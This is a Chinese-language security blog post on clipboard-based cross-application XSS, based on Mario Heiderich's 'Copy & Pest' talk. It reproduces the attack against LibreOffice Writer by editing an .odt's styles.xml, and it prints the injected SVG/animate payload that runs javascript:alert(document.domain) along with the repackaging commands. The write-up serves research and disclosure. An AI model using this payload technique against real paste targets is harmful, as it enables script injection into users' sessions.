---
layout: post
title: 跨站世界中有趣的复制与粘贴
---

Mario Heiderich 在 2015-03-30 发表了名为《Copy & Pest - A case-study on the clipboard, blind trust and invisible cross-application XSS》的 PPT ，地址：[http://www.slideshare.net/x00mario/copypest](http://www.slideshare.net/x00mario/copypest)

PPT 讲述了几个部分：
 
 - 为什么会出现这种问题？
 - 为什么问题会出现在这里？
 - 我们能够做些什么？
 - 谁需要修复这些问题？
 - ...
 
我在10年使用阿里旺旺时发现从 Office 中复制过来的内容巧妙的在输入框内保持了原有样式，虽知可能会存在一些问题，但简单的折腾了下并未能真正做出复制与粘贴风险的DEMO，马里奥这个比较有意思，另外这里的复制粘贴与富文本有那么点儿相似，但却大不同。

 - [http://server.n0tr00t.com/tools/copypaste.html](http://server.n0tr00t.com/tools/copypaste.html) @html5sec
 
上面小脚本能将剪切板中的内容解析出来，例如我们使用 Word 编辑文字后并粘贴到 [3rd: and paste is here] 区域：

![http://ww2.sinaimg.cn/large/c334041bgw1eqy8r2xhttj213h0f7acd.jpg](http://ww2.sinaimg.cn/large/c334041bgw1eqy8r2xhttj213h0f7acd.jpg)    <!--[if gte mso 10]>
    <style>
     /* Style Definitions */
    table.MsoNormalTable
        {mso-style-name:"Table Normal";
        mso-tstyle-rowband-size:0;
        mso-tstyle-colband-size:0;
        mso-style-noshow:yes;
        mso-style-priority:99;
        mso-style-parent:"";
        mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
        mso-para-margin:0cm;
        mso-para-margin-bottom:.0001pt;
        mso-pagination:widow-orphan;
        font-size:12.0pt;
        font-family:Cambria;
        mso-ascii-font-family:Cambria;
        mso-ascii-theme-font:minor-latin;
        mso-hansi-font-family:Cambria;
        mso-hansi-theme-font:minor-latin;
        mso-fareast-language:ZH-CN;}
    </style>
    <![endif]-->

    <!--StartFragment-->
    <p class="MsoNormal"><b><span style="font-size:28.0pt;font-family:&quot;Apple Chancery&quot;;color:red">Linux.im<o:p></o:p></span></b></p>
    <!--EndFragment-->
    
眼见并不为真，来对已经公开的案例进行重现（LibreOffice Writer for Ubuntu）：

 1. 新建 OpenOffice odt 文档
 2. 修改为压缩包格式
 3. 篡改 odt 目录结构中的 XML
 4. 无损恢复成原始文档
 
##### 创建文档

![http://ww4.sinaimg.cn/large/c334041bgw1eqy966a4btj21fc0d542b.jpg](http://ww4.sinaimg.cn/large/c334041bgw1eqy966a4btj21fc0d542b.jpg)

此时复制解析后的 text/html 代码为：

    <style type="text/css">H1 { margin-bottom: 0.08in; }H1.western { font-family: "Liberation Sans",sans-serif; font-size: 16pt; }H1.cjk { font-family: "WenQuanYi Micro Hei"; font-size: 16pt; }H1.ctl { font-family: "Lohit Hindi"; font-size: 16pt; }P { margin-bottom: 0.08in; }</style>

    <h1 class="western"><font color="#800000"><font style="font-size: 28pt" size="6"><span style="background: #ffff00">Linux.im: Please copy me =)</span></font></font></h1>

##### 修改格式

![http://ww3.sinaimg.cn/large/c334041bgw1eqy9a2zgzjj20ka0hyae6.jpg](http://ww3.sinaimg.cn/large/c334041bgw1eqy9a2zgzjj20ka0hyae6.jpg)

##### 篡改 styles.xml

    <style type="text/css">H1 { margin-bottom: 0.08in; }H1.western { font-family: "Liberation Sans",sans-serif; font-size: 16pt; }H1.cjk { font-family: "WenQuanYi Micro Hei"; font-size: 16pt; }H1.ctl { font-family: "Lohit Hindi"; font-size: 16pt; }P { margin-bottom: 0.08in; }</style>
    
寻找可控点为 font-family ，篡改对应的 styles 样式文件，闭合标签并植入恶意 Payload：

    &lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;1
    
##### 恢复原始文档

    _> zip -u x1.zip
    _> mv x1.zip x1.odt

![http://ww1.sinaimg.cn/large/c334041bgw1eqy9o9bhjbj21eq0jpjyw.jpg](http://ww1.sinaimg.cn/large/c334041bgw1eqy9o9bhjbj21eq0jpjyw.jpg)

##### 其它

- Adobe Reader
- Microsoft Office
- XPS Viewer
- ...

Mario PPT 中讲谈到了几个典型应用存在的类似问题，随后我又对 MS Office For MAC 等软件进行了挖掘，比较有趣的是 MS Office For MAC 版本中的 XSS Filter 耗费了我大量时间来 Bypass 过滤器，感兴趣的可以试一下。

这种交互式跨站攻击虽稍有鸡肋，但在现实世界中可能仍会发生，期待未来的真实案例。
